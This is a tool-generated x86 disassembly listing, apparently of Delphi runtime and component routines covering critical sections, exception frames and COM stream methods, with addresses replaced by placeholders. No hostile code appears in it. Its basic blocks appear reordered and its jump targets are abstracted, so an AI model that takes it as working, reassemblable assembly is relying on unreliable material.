mov ecx 0x4
mov eax ebx
call sub_418d3c
mov edx edi
mov ecx [ esp ]
mov eax ebx
call sub_418d3c
jmp r-xdata
mov dl 0xc
mov eax ebx
call sub_418f24
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_418d3c
mov dl 0x6
mov eax ebx
call sub_418f24
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_418d3c
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ esp ]
mov eax ebx
call sub_418d3c
sub_418ed0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_418f15
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405a40
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_418e38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418f1c
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
sub_418fac
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx eax
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
je r-xdata
test ebx ebx
jle r-xdata
call GetCurrentThreadId
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b37c
call sub_4039cc
call sub_418f84
mov eax ebx
call sub_418f90
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_41913a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push rw-data
call InterlockedExchange
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41911b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419122
mov eax [ ebp - 0xc ]
call sub_403258
retn
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor edx edx
mov eax [ ebp - 0xc ]
call sub_4137ac
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax [ ebp - 0xc ]
call sub_41369c
push rw-data
call LeaveCriticalSection
xor eax eax
push ebp
push sub_4190e5
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_4190b6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call EnterCriticalSection
retn
sub_41914c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov al [ r-xdata ]
mov [ edi + 0x24 ] al
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax edi
test bl bl
je r-xdata
mov edx edi
mov eax esi
call sub_419304
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_419198
push ebx
push esi
push ecx
call sub_4035cc
mov [ esp ] dl
mov ebx eax
mov eax ebx
call sub_4193ec
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_419394
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
jmp r-xdata
mov dl [ esp ]
and dl 0xfc
mov eax ebx
call sub_413d24
cmp [ esp ] 0x0
jle r-xdata
mov edx ebx
call sub_41935c
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
pop edx
pop esi
pop ebx
retn
mov eax ebx
call sub_4035b4
lea eax [ ebx + 0x14 ]
call sub_40cb64
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx [ esi + 0x8 ]
dec edx
mov eax esi
call sub_4137ac
mov cl 0x1
mov edx ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_41921c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
cmp eax [ esi + 0x4 ]
je r-xdata
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_413808
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebx + 0x14 ] eax
or [ ebx + 0x1c ] 0x100
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_413650
mov edx ebx
mov eax esi
call sub_41921c
sub_4192b0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_413650
mov [ esi + 0x4 ] ebx
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebx + 0x10 ] eax
sub_4192dc
push ebx
mov ebx eax
xor eax eax
mov [ edx + 0x4 ] eax
mov eax [ ebx + 0x10 ]
call sub_4138f0
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
call sub_403258
xor eax eax
mov [ ebx + 0x10 ] eax
sub_419304
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_403454
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx ebx
mov eax edi
mov esi [ eax ]
call [ esi + 0x20 ]
mov edx ebx
mov eax edi
call sub_4192b0
mov dl 0x1
mov eax ebx
call sub_419824
test [ edi + 0x1c ] 0x10
je r-xdata
xor ecx ecx
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop edi
pop esi
pop ebx
retn
mov cl 0x1
mov dl 0x1
mov eax ebx
call sub_4197d4
sub_41935c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
push 0x0
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x20 ]
mov cl 0x1
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
xor edx edx
mov eax ebx
call sub_419824
mov edx ebx
mov eax esi
call sub_4192dc
pop edi
pop esi
pop ebx
retn
sub_419394
push ebx
push esi
push edi
mov esi eax
jmp r-xdata
mov ebx [ esi + 0x10 ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_413894
mov edi eax
test [ edi + 0x1d ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
call sub_41935c
jmp r-xdata
mov ax [ r-xdata ]
and ax [ esi + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov edx edi
mov eax esi
call sub_4192dc
sub_4193ec
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
or [ ebx + 0x1c ] 0x8
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x10 ]
call sub_4137ac
call sub_4193ec
inc edi
dec esi
jne r-xdata
sub_419428
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
pop ebx
retn
call sub_4138f0
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
call sub_403258
xor eax eax
mov [ ebx + 0x14 ] eax
sub_41944c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_419428
mov edx ebx
mov eax esi
call sub_419428
pop esi
pop ebx
retn
sub_419468
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
cmp [ esp ] 0x1
jne r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx edi
mov eax esi
call sub_41944c
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_4137ac
mov cl [ esp ]
mov edx edi
mov ebp [ eax ]
call [ ebp + 0x10 ]
dec ebx
mov eax [ esi + 0x10 ]
mov eax [ eax + 0x8 ]
cmp ebx eax
jl r-xdata
test ebx ebx
jge r-xdata
mov ebx eax
dec ebx
sub_4194c4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
push ebx
push sub_419270
push ebx
push sub_419298
mov ax [ ebx + 0x18 ]
cmp ax [ ebp - 0x4 ]
setne cl
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_419284
push ebx
push sub_4192a4
mov ax [ ebp - 0x2 ]
cmp ax [ ebx + 0x1a ]
setne cl
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ eax + 0x18 ]
mov [ ebp - 0x4 ] eax
sub_4195bc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test edi edi
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_407b88
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebx + 0x4 ] 0x0
je r-xdata
cmp ebx [ edi + 0x4 ]
jne r-xdata
push esi
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ ebx + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov edx esi
mov eax ebx
call sub_419654
test eax eax
je r-xdata
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b37c
call sub_4039cc
sub_419654
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
cmp [ esp ] 0x0
je r-xdata
xor esi esi
cmp [ edi + 0x10 ] 0x0
je r-xdata
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor ebp ebp
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
dec ebx
jne r-xdata
mov eax [ edi + 0x10 ]
mov edx ebp
call sub_4137ac
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esp ]
call sub_407b88
test al al
jne r-xdata
sub_4196a4
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x8 ]
mov edx esi
call sub_40439c
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
mov eax esi
call sub_407ca4
test al al
jne r-xdata
push esi
mov ecx [ ebx + 0x8 ]
xor edx edx
mov eax ebx
mov edi [ eax ]
call [ edi + 0x20 ]
push esi
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0x20 ]
jmp r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b37c
call sub_4039cc
xor edx edx
mov eax ebx
call sub_419824
mov edx esi
mov eax ebx
call sub_419730
mov dl 0x1
mov eax ebx
call sub_419824
sub_419744
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_4137ac
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ecx esi
mov eax [ r-xdata ]
call sub_413738
sub_419780
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x10 ]
mov edx ebx
call sub_413808
test eax eax
jl r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ edx + 0x10 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_41369c
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx ebx
mov edx esi
call sub_413828
sub_4197d4
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebx edx
mov esi eax
test bl bl
je r-xdata
and [ esi + 0x1c ] 0xffef
or [ esi + 0x1c ] 0x10
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_419770
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
cmp [ esp ] 0x0
je r-xdata
inc ebp
xor edi edi
mov edx edi
mov eax esi
call sub_419744
mov cl 0x1
mov edx ebx
call sub_4197d4
inc edi
dec ebp
jne r-xdata
sub_419824
push ebx
push esi
push edi
add esp 0xffffff00
mov ebx edx
mov edi eax
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
add esp 0x100
pop edi
pop esi
pop ebx
retn
mov eax esp
mov edx [ edi + 0x8 ]
mov ecx 0xff
call sub_40422c
mov edx esp
mov eax esi
call sub_403514
test eax eax
je r-xdata
test bl bl
je r-xdata
xor edx edx
mov [ eax ] edx
mov [ eax ] edi
jmp r-xdata
sub_41986c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_419894
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_4198f0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
push edi
push esi
mov eax [ ebx + 0x20 ]
push eax
mov eax [ eax ]
call [ eax ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_40330c
test al al
je r-xdata
mov eax 0x80004002
jmp r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_419930
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_419950
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_419974
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403228
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_4199bc
push ebx
push esi
call sub_4035cc
mov ebx edx
mov esi eax
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403248
test bl bl
jle r-xdata
mov edx esi
call sub_419bec
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_419a24
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov [ ebx + 0x10 ] esi
test esi esi
je r-xdata
mov edx ebx
call sub_419bec
mov edx ebx
mov eax esi
call sub_419be0
sub_419a68
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41914c
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ esi + 0x50 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax esi
pop esi
pop ebx
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_419aac
push ebx
push esi
push edi
call sub_4035cc
mov ebx edx
mov edi eax
mov edx ebx
and dl 0xfc
mov eax edi
call sub_419198
mov eax [ edi + 0x30 ]
test eax eax
je r-xdata
mov esi [ edi + 0x50 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx edi
call sub_41944c
jmp r-xdata
mov eax esi
call sub_413894
mov edx eax
mov eax edi
call sub_419bec
lea eax [ edi + 0x50 ]
call sub_40cb64
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4035b4
sub_419b0c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_419468
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x30 ]
jne r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
sub_419b38
push ebx
cmp [ eax + 0x42 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov al 0x1
pop ebx
retn
sub_419b54
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
mov al 0x1
pop ebx
retn
sub_419b70
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x40 ]
jne r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x44 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x40 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x44 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx edi
mov eax [ ebx + 0x50 ]
call sub_4137ac
mov edx [ eax ]
call [ edx + 0x10 ]
inc edi
dec esi
jne r-xdata
sub_419bec
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
xor eax eax
mov [ ebp + 0x10 ] eax
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_41369c
jmp r-xdata
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_4137ac
cmp ebp eax
jne r-xdata
sub_419c2c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x30 ] eax
test eax eax
je r-xdata
mov edx ebx
call sub_41944c
mov edx ebx
call sub_41921c
sub_419c58
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403228
mov [ edi + 0xc ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x10 ] al
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_419ca0
push ebx
push esi
call sub_4035cc
mov ebx edx
mov esi eax
cmp [ esi + 0x10 ] 0x1
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403248
test bl bl
jle r-xdata
mov eax [ esi + 0xc ]
call sub_403258
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_419cd8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_419d27
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_419d40
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_419d8f
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_419da8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_419e12
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jl r-xdata
mov ebx 0x80030001
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp ebx 0x2
jle r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
mov eax [ esi + 0xc ]
mov ecx ebx
mov edx [ ebp + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x8 ]
mov [ eax ] edx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x4 ] edx
sub_419e2c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_419e75
push [ fs : eax ]
mov [ fs : eax ] esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebx + 0xc ]
call sub_415470
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ ebp + 0x10 ]
jne r-xdata
je r-xdata
cmp eax [ ebp + 0xc ]
xor ebx ebx
mov ebx 0x80004005
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_419e90
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
call sub_405640
xor eax eax
push ebp
push sub_41a07d
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1c ] 0x0
xor edx edx
push ebp
push sub_41a056
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x100000
jbe r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0xc ] 0x100000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_4026bc
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_41a045
push [ fs : edx ]
mov [ fs : edx ] esp
jmp r-xdata
jg r-xdata
cmp [ ebp + 0x10 ] 0x0
ja r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4026dc
mov eax [ ebp + 0x1c ]
test eax eax
je r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x1c ]
mov edx [ ebp - 0x20 ]
mov [ eax ] edx
mov edx [ ebp - 0x1c ]
mov [ eax + 0x4 ] edx
mov esi [ ebp + 0x10 ]
mov esi 0x7fffffff
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x18 ]
mov [ eax ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x4 ] edx
cmp esi [ ebp - 0xc ]
jle r-xdata
test esi esi
jle r-xdata
mov eax esi
mov eax [ ebp - 0xc ]
jmp r-xdata
mov eax ebx
cdq
add [ ebp - 0x18 ] eax
adc [ ebp - 0x14 ] edx
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x24 ]
add [ ebp - 0x20 ] eax
adc [ ebp - 0x1c ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
call sub_403a78
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0xc ]
xchg ecx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
test ebx ebx
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a084
lea eax [ ebp + 0xc ]
call sub_4055cc
retn
sub esi ebx
mov eax ebx
cdq
sub [ ebp + 0x10 ] eax
sbb [ ebp + 0x14 ] edx
test esi esi
jg r-xdata
call sub_403a78
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0x80004005
sub_41a0c0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
xor esi esi
xor eax eax
push ebp
push sub_41a123
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebx + 0x4 ] 0x2
mov eax [ edi + 0xc ]
mov edx [ eax ]
call [ edx ]
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] edx
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x18 ] eax
xor eax eax
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x20 ] eax
xor eax eax
mov [ ebx + 0x24 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41a154
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_413b18
mov edi eax
xor eax eax
push ebp
push sub_41a1a9
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
